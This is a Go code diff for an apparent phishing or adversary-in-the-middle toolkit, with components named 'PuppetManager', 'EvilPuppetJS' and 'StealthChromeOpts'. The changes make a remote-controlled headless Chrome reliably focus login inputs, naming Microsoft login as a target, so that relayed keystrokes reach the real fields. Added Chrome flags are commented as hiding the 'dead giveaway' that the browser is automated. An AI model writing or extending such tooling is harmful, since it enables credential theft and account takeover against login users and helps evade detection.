@@ -729,20 +729,49 @@ func (pm *PuppetManager) handleClick(puppet *PuppetInstance, pi PuppetInput) err
 		defer cancel()
 		err := chromedp.Run(ctx, chromedp.Click(pi.CSSPath, chromedp.ByQuery))
 		if err == nil {
-			// After clicking, explicitly focus the element if it's an input/textarea/select.
-			// Some sites prevent auto-focus from clicks, or CDP mouse events may not
-			// transfer keyboard focus reliably. This ensures we can type into the element.
+			// After clicking, ensure an editable element gets focus.
+			// On many sites (like Microsoft login), the user clicks on a label/placeholder
+			// div that visually overlays the input. The click lands on the div, not the
+			// actual <input>. We need to find and focus the nearest input.
 			cssPathJSON, _ := json.Marshal(pi.CSSPath)
-			var ignored interface{}
+			var focusResult string
 			chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`(function() {
 				var el = document.querySelector(%s);
-				if (el) {
-					var tag = el.tagName;
-					if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
-						el.focus();
-					}
+				if (!el) return 'NOT_FOUND';
+
+				// Check if click already focused an input (natural behavior)
+				var active = document.activeElement;
+				if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
+					return 'ALREADY_FOCUSED:' + active.tagName + '#' + (active.id || '');
 				}
-			})()`, string(cssPathJSON)), &ignored))
+
+				// The clicked element itself might be the input
+				if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
+					el.focus();
+					return 'DIRECT_FOCUS:' + el.tagName;
+				}
+
+				// Search for input/textarea: first inside the clicked element,
+				// then in parent, then in grandparent, then siblings.
+				// This handles label/placeholder overlays on login pages.
+				var input = el.querySelector('input, textarea, select');
+				if (!input && el.parentElement) {
+					input = el.parentElement.querySelector('input, textarea, select');
+				}
+				if (!input && el.parentElement && el.parentElement.parentElement) {
+					input = el.parentElement.parentElement.querySelector('input, textarea, select');
+				}
+				// Also try: if clicked element has a 'for' attribute (label)
+				if (!input && el.htmlFor) {
+					input = document.getElementById(el.htmlFor);
+				}
+				if (input) {
+					input.focus();
+					return 'FOUND_NEARBY:' + input.tagName + '#' + (input.id || '');
+				}
+				return 'NO_INPUT_NEARBY';
+			})()`, string(cssPathJSON)), &focusResult))
+			log.Info("puppet [%d]: post-click focus: %s", puppet.Id, focusResult)
 			return nil
 		}
 		log.Warning("puppet [%d]: CSS click failed (%v), falling back to coordinates (%.0f, %.0f)", puppet.Id, err, pi.X, pi.Y)
@@ -753,7 +782,7 @@ func (pm *PuppetManager) handleClick(puppet *PuppetInstance, pi PuppetInput) err
 		return fmt.Errorf("no CSS path and no coordinates for click")
 	}
 	log.Info("puppet [%d]: coordinate click at (%.0f, %.0f)", puppet.Id, pi.X, pi.Y)
-	return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+	err := chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
 		if err := input.DispatchMouseEvent(input.MouseMoved, pi.X, pi.Y).Do(ctx); err != nil {
 			return err
 		}
@@ -772,12 +801,39 @@ func (pm *PuppetManager) handleClick(puppet *PuppetInstance, pi PuppetInput) err
 			WithClickCount(1).
 			Do(ctx)
 	}))
+	if err != nil {
+		return err
+	}
+
+	// After coordinate click, check if an editable element got focus.
+	// If not, look at the element at the clicked coordinates and find nearby input.
+	var focusResult string
+	chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`(function() {
+		var active = document.activeElement;
+		if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
+			return 'FOCUSED:' + active.tagName + '#' + (active.id || '');
+		}
+		var el = document.elementFromPoint(%f, %f);
+		if (!el) return 'NO_ELEMENT_AT_POINT';
+		var input = el.querySelector('input, textarea, select');
+		if (!input && el.parentElement) input = el.parentElement.querySelector('input, textarea, select');
+		if (!input && el.parentElement && el.parentElement.parentElement) {
+			input = el.parentElement.parentElement.querySelector('input, textarea, select');
+		}
+		if (input) {
+			input.focus();
+			return 'COORD_FOUND_NEARBY:' + input.tagName + '#' + (input.id || '');
+		}
+		return 'NO_INPUT_NEARBY:' + el.tagName;
+	})()`, pi.X, pi.Y), &focusResult))
+	log.Info("puppet [%d]: post-coord-click focus: %s", puppet.Id, focusResult)
+	return nil
 }
 
-// ensureFocus ensures the given CSS selector element has focus in the puppet browser.
-// This is critical because CDP key events go to whatever element has focus. Without
-// explicit focus management, typing can silently fail if focus drifted between the
-// click and the keypress. EvilPuppetJS sends cssPath with every keypress for this reason.
+// ensureFocus ensures the given CSS selector element (or a nearby input) has focus
+// in the puppet browser. This is critical because CDP key events go to whatever
+// element has focus. The client sends cssPath of the focused element in the iframe,
+// which might be a label/wrapper div. We need to find the actual input in the puppet.
 func ensureFocus(ctx context.Context, puppetCtx context.Context, cssPath string) {
 	if cssPath == "" {
 		return
@@ -785,12 +841,32 @@ func ensureFocus(ctx context.Context, puppetCtx context.Context, cssPath string)
 	cssPathJSON, _ := json.Marshal(cssPath)
 	var focusedTag string
 	chromedp.Run(puppetCtx, chromedp.Evaluate(fmt.Sprintf(`(function() {
+		// First check if an input/textarea is already focused
+		var active = document.activeElement;
+		if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
+			return 'OK:' + active.tagName + '#' + (active.id || '');
+		}
+
 		var el = document.querySelector(%s);
 		if (!el) return 'NOT_FOUND';
-		var active = document.activeElement;
-		if (active === el) return el.tagName;
-		el.focus();
-		return 'FOCUSED:' + el.tagName;
+
+		// If the element itself is an input, focus it directly
+		if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
+			el.focus();
+			return 'FOCUSED:' + el.tagName + '#' + (el.id || '');
+		}
+
+		// Search for nearby input (handles label/wrapper/placeholder overlays)
+		var input = el.querySelector('input, textarea');
+		if (!input && el.parentElement) input = el.parentElement.querySelector('input, textarea');
+		if (!input && el.parentElement && el.parentElement.parentElement) {
+			input = el.parentElement.parentElement.querySelector('input, textarea');
+		}
+		if (input) {
+			input.focus();
+			return 'FOUND_NEARBY:' + input.tagName + '#' + (input.id || '');
+		}
+		return 'NO_INPUT';
 	})()`, string(cssPathJSON)), &focusedTag))
 	if focusedTag != "" {
 		log.Info("puppet: ensureFocus(%s) → %s", cssPath, focusedTag)
@@ -1196,6 +1272,20 @@ func StealthChromeOpts(userAgent string, viewportW, viewportH int, useXvfb bool)
 		chromedp.Flag("disable-features", "site-per-process,Translate,BlinkGenPropertyTrees,TranslateUI,VizDisplayCompositor"),
 		chromedp.Flag("disable-infobars", true),
 		chromedp.Flag("disable-extensions", true),
+		// --test-type suppresses the "You are using an unsupported command-line flag:
+		// --no-sandbox" infobar. Without this, the yellow banner is a dead giveaway
+		// that Chrome is being automated. This flag does NOT add any detectable JS
+		// artifacts — it only suppresses Chrome UI warnings for command-line flags.
+		chromedp.Flag("test-type", true),
+		// Suppress other infobars (password save, translation, etc.)
+		chromedp.Flag("disable-popup-blocking", true),
+		chromedp.Flag("disable-save-password-bubble", true),
+		chromedp.Flag("disable-translate", true),
+		chromedp.Flag("disable-default-apps", true),
+		chromedp.Flag("disable-component-update", true),
+		chromedp.Flag("no-first-run", true),
+		chromedp.Flag("no-default-browser-check", true),
+		chromedp.Flag("password-store", "basic"),
 	)
 
 	if useXvfb {
